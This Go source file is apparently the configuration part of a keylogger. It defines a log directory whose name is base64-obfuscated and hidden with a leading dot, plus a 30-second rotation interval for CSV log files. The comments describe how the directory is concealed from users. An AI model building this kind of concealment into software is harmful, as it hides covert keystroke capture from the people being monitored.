package main

import "time"

// Name of the directory where our logs and other data is stored.
//
// `a2V5bG9nZ2VyLWRhdGE` is base64 for `keylogger-data`.
// `.` makes it hidden on Linux (and probably MacOS too.)
//
// On Windows, it is hidden when `createHiddenDirectory` is called.
const APPLICATION_DIRECTORY = ".a2V5bG9nZ2VyLWRhdGE"

// The time after which the current CSV file should be cycled
const CYCLE_TIME = 30 * time.Second
